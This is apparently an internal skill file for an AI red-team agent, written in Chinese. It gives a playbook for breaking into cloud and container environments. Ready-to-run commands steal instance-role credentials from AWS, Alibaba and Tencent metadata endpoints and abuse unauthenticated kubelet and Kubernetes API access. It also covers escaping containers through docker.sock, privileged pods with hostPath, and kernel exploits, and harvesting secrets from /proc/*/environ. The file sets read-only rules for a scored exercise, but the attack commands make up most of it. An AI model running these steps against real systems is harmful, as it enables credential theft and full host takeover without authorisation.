---
name: cloud-container
description: 云与容器环境利用：云元数据（IMDS）取临时凭据、K8s API/kubelet 未授权、Docker socket 与特权容器逃逸
whenToUse: 目标跑在公有云/容器里（响应头有云厂商、主机名像 pod、/.dockerenv 存在、或发现 6443/10250/2375 端口）
role: internal
enabled: true
---

# 云与容器（元数据、K8s、运行时逃逸）

云上打法和物理机不同：**最高价值的入口是"实例角色凭据"**——一个 `169.254.169.254`
可能直接换来整个账号的 OSS/S3、ECS、甚至 RAM 权限。容器内则先判断"逃不逃得出去"。

## 一、先判断运行环境

```bash
# 在拿到的 shell 里跑
cat /proc/1/cgroup | head -5; ls -la /.dockerenv 2>/dev/null        # 容器特征
hostname                                                            # 随机串/pod 名
cat /proc/self/mountinfo | grep -E 'kube|overlay' | head -5
curl -sS -m 3 -o /dev/null -w '%{http_code}\n' http://169.254.169.254/   # 云主机
env | grep -iE 'kube|aws|aliyun|tencent' | head
```

- 有 `/.dockerenv` 或 cgroup 里有 `docker`/`kubepods` → **容器**，走第四节；
- 能访问元数据地址 → **云主机**，走第二节；
- 同时发现 `6443`/`10250` → **K8s 节点**，走第三节。

## 二、云元数据（IMDS）——最高性价比

```bash
# AWS（IMDSv1；v2 需要先拿 token）
curl -sS -m 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -sS -m 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# AWS IMDSv2
TOKEN=$(curl -sS -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')
curl -sS -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
# 阿里云（100.100.100.200）
curl -sS http://100.100.100.200/latest/meta-data/
curl -sS http://100.100.100.200/latest/meta-data/ram/security-credentials/
# 腾讯云
curl -sS http://metadata.tencentyun.com/latest/meta-data/
curl -sS http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/
```

拿到 `AccessKeyId / AccessKeySecret / Token` 后**先用只读接口验证权限边界**：

```bash
# 阿里云：列 OSS bucket / RAM 身份（只读，不改任何资源）
aliyun oss ls
aliyun sts GetCallerIdentity
# AWS
aws sts get-caller-identity
aws s3 ls
# 腾讯云
tccli cam GetUserAppId ; tccli cos ls
```

**纪律**：只做**读**（列桶、看策略、下载 1 个样本证明可读）。改策略、删资源、开公网 ACL
都属于事故级操作，演练里一律不做。

## 三、Kubernetes

```bash
# 1) API Server 匿名/低权访问（6443）
curl -sk https://<target>:6443/api                     # 200 = 允许匿名；403 = 需认证但可能 token 可用
curl -sk https://<target>:6443/version
# 2) 容器内 ServiceAccount（挂了 token 就能直接调 API）
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods
# 3) kubelet 只读/执行接口（10250，常见未授权）
curl -sk https://<target>:10250/pods | head -c 500
curl -sk -X POST "https://<target>:10250/run/<ns>/<pod>/<container>" -d 'cmd=id'
# 4) 权限探测（有 kubectl 时）
kubectl --server=https://<target>:6443 --insecure-skip-tls-verify auth can-i --list
```

有 `create pods` 权限就等于**集群节点 root**（挂载宿主机目录起 pod）：

```yaml
apiVersion: v1
kind: Pod
metadata: { name: escape, namespace: default }
spec:
  hostPID: true
  containers:
    - name: c
      image: alpine
      command: ["sh","-c","sleep 3600"]
      securityContext: { privileged: true }
      volumeMounts: [{ name: h, mountPath: /host }]
  volumes: [{ name: h, hostPath: { path: / } }]
```

## 四、容器逃逸（从容器到宿主机）

```bash
# 1) Docker socket 挂进来了？直接控制宿主机 docker
ls -la /var/run/docker.sock && docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run -it -v /:/host alpine chroot /host sh
# 2) 特权容器（cap_sys_admin）：挂 cgroup 写 release_agent
capsh --print | grep sys_admin
# 3) 挂了宿主机目录（hostPath）：直接读写宿主文件
mount | grep -E ' /host| /mnt' ; ls /host
# 4) 内核提权（容器共享内核）：DirtyPipe / PwnKit 在容器内同样有效
uname -r
```

逃逸成功后：宿主机上通常有 **kubelet 配置、云 AK、其他容器的环境变量**——
`cat /var/lib/kubelet/kubeconfig`、`crictl ps`、`cat /proc/*/environ`（grep 密码）。

## 五、拿到云凭据之后（把"能读"变成得分）

1. **证明数据规模**：`aws s3 ls` / `oss ls` 列出桶名，对 1~2 个桶取对象数与前几条 key，
   写进 evidence（"大量敏感信息"门槛是 ≥100 万条 / 10TB，要如实统计，不能估）；
2. **找横向凭据**：OSS 里的备份文件、`.env`、数据库导出、CI 配置（常含 AK/密码）；
3. **不要动生产资源**：不删桶、不改 ACL、不创建公网可读策略、不启大规格实例；
4. **记录身份**：`GetCallerIdentity` 的账号 ID / 角色名就是"拿到什么权限"的凭证。

## 六、纪律

1. **元数据是只读的**，随便打；但**云 API 的写操作一律不做**（删/改/扩）。
2. **K8s 上只 create 一个临时 pod 并立刻删除**，别留 `escape` 名字的 pod 在集群里。
3. **容器逃逸前先想清楚**：HostPID/privileged 的 pod 可能是业务组件，动它会引发重启。
4. **不下载全量数据**：证明能读即可（1 个对象 + 对象数统计）。
5. **凭据及时落库**：云 AK 有效期通常几小时，先落库再继续（`redteam_credential_add`）。

## 七、落库（强制）

1. 环境判定结论写资产 `surface`（`redteam_asset_test`：`surface` = "阿里云 ECS / 容器内 / K8s 节点"）。
2. 云 AK / kubeconfig / SA token：`redteam_credential_add`（`type=cloud-key`/`token`，
   `source=元数据`/`容器文件`，`tool` 写命令）。
3. 权限得分：`redteam_score_hit`
   - 云账号只读/读写 → 对应"云资源权限"得分点，`evidence` 写"账号 ID + 可读桶数 + 样本 key"；
   - 集群 admin / 节点 root → `server-host` / `cluster-admin`，`evidence` 写 pod 名与 `whoami` 输出。
4. 逃逸路径与 pod yaml：`redteam_attack_file_add`（把 yaml 挂到攻击步骤上，报告可直接引用）。
5. `redteam_chain_add` 每步留命令与回显摘要。
